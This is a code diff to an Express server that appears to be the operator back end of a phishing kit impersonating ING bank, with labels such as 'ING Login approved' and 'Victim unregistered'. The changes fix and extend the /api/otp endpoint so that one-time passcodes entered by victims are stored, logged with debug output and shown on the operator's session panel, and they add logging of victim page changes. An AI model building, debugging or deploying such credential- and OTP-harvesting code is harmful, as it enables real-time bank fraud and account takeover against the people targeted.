@@ -219,7 +219,7 @@ function uaParser(ua) {
   return u;
 }
 
-/* ----------  SESSION HEADER HELPER  ---------- */
+/* ----------  SESSION HEADER HELPER - FIXED FOR OTP ---------- */
 function getSessionHeader(v) {
   // Approved/Success state
   if (v.page === 'success' || v.status === 'approved') return `🦁 ING Login approved`;
@@ -240,13 +240,15 @@ function getSessionHeader(v) {
     return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
   } 
   
-  // otp.html page (if you have a separate OTP page)
+  // otp.html page - THIS IS THE FIX: Check for OTP field
   else if (v.page === 'otp.html') {
-    if (v.otp && v.otp.length > 0) return `✅ Received OTP: ${v.otp}`;
-    return `🔑 Awaiting OTP...`;
+    if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
+    return `⏳ Awaiting OTP...`;
   }
   
-  // Default fallback
+  // Default fallback - also check if OTP exists on any page
+  if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
+  
   return `⏳ Waiting...`;
 }
 
@@ -352,24 +354,43 @@ app.post('/api/unregister', async (req, res) => {
     res.sendStatus(200);
   } catch (err) {
     console.error('Unregister error', err);
-    res.sendStatus(500);
+    res.status(500).send('Error');
   }
 });
 
+// FIXED: /api/otp now properly stores OTP and logs it
 app.post('/api/otp', async (req, res) => {
   try {
     const { sid, otp } = req.body;
+    console.log(`[DEBUG] OTP received - sid: ${sid}, otp: ${otp}`);
+    
     if (!otp?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
+    
     const v = sessionsMap.get(sid);
-    v.otp = otp; v.status = 'wait';
+    v.otp = otp; 
+    v.status = 'wait';
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
     v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
 
+    // Also update audit log
     const entry = auditLog.find(e => e.sid === sid);
-    if (entry) entry.otp = otp;
+    if (entry) {
+      entry.otp = otp;
+      console.log(`[DEBUG] OTP saved to audit log for victim ${entry.victimN}`);
+    } else {
+      console.log(`[DEBUG] No audit log entry found for sid: ${sid}`);
+    }
+    
+    console.log(`[DEBUG] OTP stored successfully. Current victim data:`, {
+      sid: v.sid,
+      page: v.page,
+      otp: v.otp,
+      status: v.status
+    });
+    
     res.sendStatus(200);
   } catch (err) {
     console.error('OTP error', err);
@@ -380,7 +401,10 @@ app.post('/api/otp', async (req, res) => {
 app.post('/api/page', async (req, res) => {
   try {
     const { sid, page } = req.body;
+    console.log(`[DEBUG] Page change - sid: ${sid}, page: ${page}`);
+    
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
+    
     const v = sessionsMap.get(sid);
     const oldPage = v.page;
     v.page = page;
